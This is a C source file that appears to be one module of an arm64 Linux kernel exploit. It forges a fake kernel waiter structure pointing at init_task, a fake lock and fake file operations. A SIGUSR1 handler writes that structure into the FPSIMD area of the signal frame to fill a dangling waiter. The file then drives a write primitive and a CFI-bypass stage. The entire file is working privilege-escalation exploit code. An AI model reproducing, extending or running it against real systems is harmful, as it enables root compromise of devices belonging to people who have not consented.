#include "router.h"
#include "common.h"

#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sched.h>
#include <stdatomic.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <asm/sigcontext.h>

/* Extern globals defined in other translation units */
extern uintptr_t page_base;
extern uintptr_t fake_lock;
extern uintptr_t fake_fops;
extern uint64_t  fake_w0;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern int cfi_last_step;
extern int cfi_last_errno;
extern int cfi_dirty_seen;

/* Internal state */
static volatile int sigreturn_done = 0;
static uint8_t g_fake_waiter[0x58];

static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
    (void)sig;
    (void)info;
    ucontext_t *uc = (ucontext_t *)ucontext;
    mcontext_t *mc = &uc->uc_mcontext;
    unsigned char *base = (unsigned char *)mc;

    for (int off = 0; off < 1024; off += 8) {
        uint32_t magic = *(uint32_t *)(base + off);
        if (magic == FPSIMD_MAGIC) {
            struct fpsimd_context *fpsimd = (struct fpsimd_context *)(base + off);
            uint8_t *vregs = (uint8_t *)&fpsimd->vregs[0];
            memcpy(vregs + 0x18, g_fake_waiter, 0x58);
            sigreturn_done = 1;
            return;
        }
    }
}

void do_sigreturn_fake_lock_route(void) {
    if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 30;
        cfi_last_errno = 0;
        pr_error("sigreturn route missing kernel page base=%016zx lock=%016zx fops=%016zx\\n",
                 page_base, fake_lock, fake_fops);
        return;
    }

    /* Build fake waiter (same layout as pselect fdset) */
    memset(g_fake_waiter, 0, sizeof(g_fake_waiter));
    put64(g_fake_waiter, 0x10, pselect_write_value());   /* tree_pc */
    put64(g_fake_waiter, 0x18, 0);                        /* tree_right */
    put64(g_fake_waiter, 0x20, pselect_write_target());   /* tree_left */
    put64(g_fake_waiter, 0x28, pselect_write_value());    /* pi_parent */
    put64(g_fake_waiter, 0x30, 0);                        /* pi_right */
    put64(g_fake_waiter, 0x38, pselect_write_target());   /* pi_left */
    put64(g_fake_waiter, 0x40, text_addr(INIT_TASK));     /* task */
    put64(g_fake_waiter, 0x48, fake_lock);                /* lock */
    put64(g_fake_waiter, 0x50, ((uint64_t)FAKE_WAITER_PRIO << 32) | 3); /* prio */

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigreturn_handler;
    sa.sa_flags = SA_SIGINFO | SA_RESTART;
    sigaction(SIGUSR1, &sa, NULL);

    /* Wait for victim thread to create the dangling waiter */
    usleep(50000);

    int tid = atomic_load(&waiter_tid);
    if (tid <= 0) {
        cfi_last_step = 31;
        cfi_last_errno = 0;
        pr_error("sigreturn route no waiter tid\\n");
        return;
    }

    sigreturn_done = 0;
    syscall(SYS_tgkill, getpid(), tid, SIGUSR1);

    while (!sigreturn_done) {
        sched_yield();
    }

    /* Arm consumer */
    atomic_store(&punch_consume_go, 1);

    int route_verified = 0;
    int waited = 0;
    while (waited < 500000) {
        int calls = atomic_load(&consumer_calls);
        int success = atomic_load(&consumer_success);
        if (calls > 0 && success > 0) {
            if (try_cfi_stage()) {
                cfi_last_step = 0;
                route_verified = 1;
            } else if (!cfi_last_step) {
                cfi_last_step = 32;
            }
            break;
        }
        if (cfi_dirty_seen) {
            break;
        }
        usleep(1000);
        waited += 1000;
    }

    atomic_store(&punch_consume_go, 0);

    pr_info("sigreturn route done calls=%d success=%d step=%d errno=%d\\n",
            atomic_load(&consumer_calls), atomic_load(&consumer_success),
            cfi_last_step, cfi_last_errno);
}